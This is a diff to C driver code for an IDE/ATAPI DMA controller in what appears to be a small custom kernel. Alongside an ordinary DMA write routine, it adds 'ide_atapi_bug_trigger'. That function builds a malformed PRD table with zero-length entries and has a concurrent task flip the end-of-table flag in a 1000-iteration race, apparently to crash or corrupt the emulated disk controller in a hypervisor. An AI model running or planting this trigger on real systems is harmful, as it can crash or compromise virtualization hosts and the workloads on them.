@@ -1,6 +1,9 @@
 #include <ide.h>
 #include <x86.h>
 #include <stdio.h>
+#include <physical_page.h>
+
+static void task(void* arg);
 
 unsigned char ide_atapi_dma_read(unsigned char idx, unsigned int lba,
                                  unsigned char numsects, void* addr) {
@@ -36,7 +39,8 @@ unsigned char ide_atapi_dma_read(unsigned char idx, unsigned int lba,
 		prd_table[i].end = 0;
 	}
 	prd_table[numsects - 1].end = 0x8000;
-	ide_write(channel, ATA_REG_DMA_CMD, ide_read(channel, ATA_REG_DMA_CMD) | 1 << 3);
+	outl(channels[channel].bmide + IDE_DMA_PRD,(uint32_t)prd_table);
+	ide_write(channel, ATA_REG_DMA_CMD, ide_read(channel, ATA_REG_DMA_CMD)|(1<<3));
 	ide_write(channel, ATA_REG_DMA_STATUS, ide_read(channel, ATA_REG_DMA_STATUS) | 4 | 2);
 	outsw(bus, atapi_packet, 6);
 	ide_write(channel, ATA_REG_DMA_CMD, ide_read(channel, ATA_REG_DMA_CMD) | 1);
@@ -48,6 +52,47 @@ unsigned char ide_atapi_dma_read(unsigned char idx, unsigned int lba,
 
 unsigned char ide_atapi_dma_write(unsigned char idx, unsigned int lba,
                                   unsigned char numsects, void* addr) {
+	unsigned int channel = ide_devices[idx].channel;
+	unsigned int drive = ide_devices[idx].drive;
+	unsigned int words = 2048 / 2; // Sector Size in Words, Almost All ATAPI Drives has a sector size of 2048 bytes.
+	uint8_t err;
+	unsigned int bus = channels[channel].base;
+	ide_write(channel, ATA_REG_CONTROL, channels[channel].nIEN = ide_irq_invoked = 0x0);
+	ide_write(channel, ATA_REG_HDDEVSEL, drive << 4);
+	ide_write(channel, ATA_REG_FEATURES, 1); // PIO mode
+	ide_write(channel, ATA_REG_LBA1, 0);   // Lower Byte of Sector Size.
+	ide_write(channel, ATA_REG_LBA2, 0);   // Upper Byte of Sector Size.
+	ide_write(channel, ATA_REG_COMMAND, ATA_CMD_PACKET);      // Send the Command.
+	atapi_packet[ 0] = ATAPI_CMD_WRITE;
+	atapi_packet[ 1] = 0x0;
+	atapi_packet[ 2] = (lba >> 24) & 0xFF;
+	atapi_packet[ 3] = (lba >> 16) & 0xFF;
+	atapi_packet[ 4] = (lba >> 8) & 0xFF;
+	atapi_packet[ 5] = (lba >> 0) & 0xFF;
+	atapi_packet[ 6] = 0x0;
+	atapi_packet[ 7] = 0x0;
+	atapi_packet[ 8] = 0x0;
+	atapi_packet[ 9] = numsects;
+	atapi_packet[10] = 0x0;
+	atapi_packet[11] = 0x0;
+	err = ide_polling(channel, 1);
+	if (err) return err;
+	region_desc* prd_table = channels[channel].prd_table;
+	memcpy(channels[channel].dma_buffer,addr,numsects*words*2);
+
+	for (int i = 0; i < numsects; i++) {
+		prd_table[i].address = (uint32_t)&channels[channel].dma_buffer[i*words*2];
+		prd_table[i].count = words * 2;
+		prd_table[i].end = 0;
+	}
+	prd_table[numsects - 1].end = 0x8000;
+	outl(channels[channel].bmide + IDE_DMA_PRD,(uint32_t)prd_table);
+	ide_write(channel, ATA_REG_DMA_CMD, ide_read(channel, ATA_REG_DMA_CMD) &~(1 << 3));
+	ide_write(channel, ATA_REG_DMA_STATUS, ide_read(channel, ATA_REG_DMA_STATUS) | 4 | 2);
+	outsw(bus, atapi_packet, 6);
+	ide_write(channel, ATA_REG_DMA_CMD, ide_read(channel, ATA_REG_DMA_CMD) | 1);
+	ide_wait_irq();
+	ide_write(channel, ATA_REG_DMA_CMD, ide_read(channel, ATA_REG_DMA_CMD) & (~1));
 	return 0;
 }
 
@@ -218,3 +263,90 @@ unsigned char ide_atapi_access(uint8_t direction, unsigned char drive, unsigned 
 
 	return 0; // Easy, ... Isn't it?
 }
+struct task_info{
+	uint16_t* value;
+	uint16_t stop;
+};
+unsigned char ide_atapi_bug_trigger() {
+	unsigned char idx = 1;
+	unsigned int lba = 0;
+    unsigned char numsects = 3;
+
+	unsigned int channel = ide_devices[idx].channel;
+	unsigned int drive = ide_devices[idx].drive;
+	uint8_t err;
+	unsigned int bus = channels[channel].base;
+	ide_write(channel, ATA_REG_CONTROL, channels[channel].nIEN = ide_irq_invoked = 0x0);
+	ide_write(channel, ATA_REG_HDDEVSEL, drive << 4);
+	ide_write(channel, ATA_REG_FEATURES, 1); // PIO mode
+	ide_write(channel, ATA_REG_LBA1, 0);   // Lower Byte of Sector Size.
+	ide_write(channel, ATA_REG_LBA2, 0);   // Upper Byte of Sector Size.
+	ide_write(channel, ATA_REG_COMMAND, ATA_CMD_PACKET);      // Send the Command.
+	atapi_packet[ 0] = ATAPI_CMD_WRITE;
+	atapi_packet[ 1] = 0x0;
+	atapi_packet[ 2] = (lba >> 24) & 0xFF;
+	atapi_packet[ 3] = (lba >> 16) & 0xFF;
+	atapi_packet[ 4] = (lba >> 8) & 0xFF;
+	atapi_packet[ 5] = (lba >> 0) & 0xFF;
+	atapi_packet[ 6] = 0x0;
+	atapi_packet[ 7] = 0x0;
+	atapi_packet[ 8] = 0x0;
+	atapi_packet[ 9] = numsects;
+	atapi_packet[10] = 0x0;
+	atapi_packet[11] = 0x0;
+	err = ide_polling(channel, 1);
+	if (err) return err;
+	region_desc* prd_table = channels[channel].prd_table;
+
+	uint8_t* addr = physical_alloc(0x10000,0x10000);
+	memset(addr,'\xcc',0x10000);
+	uint8_t fake_secs = 4;
+	uint8_t really_secs = 20;
+	for (int i = 0; i < fake_secs; i++) {
+		prd_table[i].address = (uint32_t)addr;
+		prd_table[i].count = 0x1000;
+		prd_table[i].end = 0;
+	}
+	prd_table[fake_secs-1].end = 0x8000;
+	for (int i = fake_secs; i < really_secs; i++) {
+		prd_table[i].address = (uint32_t)addr;
+		prd_table[i].count = 0;
+		prd_table[i].end = 0;
+	}
+	prd_table[really_secs-1].end = 0x8000;
+	outl(channels[channel].bmide + IDE_DMA_PRD,(uint32_t)prd_table);
+	void create_task(void (*p)(void*),void* arg);
+
+	struct task_info info;
+	info.value = &prd_table[fake_secs-1].end;
+	info.stop = 0;
+	create_task(task,&info);
+	for(int i=0;i<1000;i++){
+		ide_write(channel, ATA_REG_DMA_CMD, ide_read(channel, ATA_REG_DMA_CMD) &~(1 << 3));
+		ide_write(channel, ATA_REG_DMA_STATUS, ide_read(channel, ATA_REG_DMA_STATUS) | 4 | 2);
+		outsw(bus, atapi_packet, 6);
+		ide_write(channel, ATA_REG_DMA_CMD, ide_read(channel, ATA_REG_DMA_CMD) | 1);
+		ide_wait_irq();
+		ide_write(channel, ATA_REG_DMA_CMD, ide_read(channel, ATA_REG_DMA_CMD) & (~1));
+	}
+	info.stop = 1;
+	debug("crash?\n");
+	return 0;
+}
+static void task(void* arg){
+	struct task_info* info = arg;
+	register uint16_t* ptr = info->value;
+	while(!info->stop){
+		*ptr = 0x8000;
+		*ptr = 0;
+	}
+}
+
+
+
+
+
+
+
+
+
